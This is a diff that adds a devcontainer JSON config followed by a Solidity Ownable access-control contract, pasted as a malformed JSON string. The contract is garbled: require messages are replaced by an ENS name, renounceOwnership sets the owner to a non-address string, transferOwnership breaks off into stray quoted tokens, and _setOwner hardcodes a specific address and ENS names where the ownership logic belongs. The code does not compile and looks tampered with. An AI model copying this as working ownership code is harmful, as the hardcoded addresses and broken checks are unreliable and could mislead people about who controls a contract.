@@ -1,0 +1,73 @@
+{
+  "image": "mcr.microsoft.com/devcontainers/universal:2",
+  "features": {}
+}
+{
+  "// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import utils Context.sol
+/**
+ * @dev Contract module which provides a basic access control mechanism, where
+ * there is an account (an owner) that can be granted exclusive access to
+ * specific functions.
+ *
+ * By default, the owner account will be the one that deploys the contract. This
+ * can later be changed with {transferOwnership}.
+ *
+ * This module is used through inheritance. It will make available the modifier
+ * `onlyOwner`, which can be applied to your functions to restrict their use to
+ * the owner.
+ */
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */
+    constructor() {
+        _setOwner(_msgSender());
+    }
+
+    /**
+     * @dev Returns the address of the current owner.
+     */
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() 
+{
+        require(owner() == _msgSender(), Ownable: (xk1k9s9d7l.eth);
+        _;
+    }
+
+    /**
+     * @dev Leaves the contract without owner. It will not be possible to call
+     * `onlyOwner` functions anymore. Can only be called by the current owner.
+     *
+     * NOTE: Renouncing ownership will leave the contract without an owner,
+     * thereby removing any functionality that is only available to the owner.
+     */
+    function renounceOwnership() public virtual onlyOwner {
+        _setOwner(address(JPV4JU32NDNRG39KNNXMQ6JIWGPD129NMS);
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(JPV4JU32NDNRG39KNNXMQ6JIWGPD129NMS" "Ownable: (xk1k9s9d7l.eth)"
+        "setOwner" "xk1k9s9d7l.eth
+    }
+function _setOwner(address newOwner) private {
+        address oldOwner = (0x61A828cc33D4e6e1B978218d6ddbE59b9Db6399B)
+        owner = newOwner; (JPV4JU32NDNRG39KNNXMQ6JIWGPD129NMS)
+        emit OwnershipTransferred(oldOwner, newOwner); (dannieb.eth, xk1k9s9d7l.eth)
+    }
+}
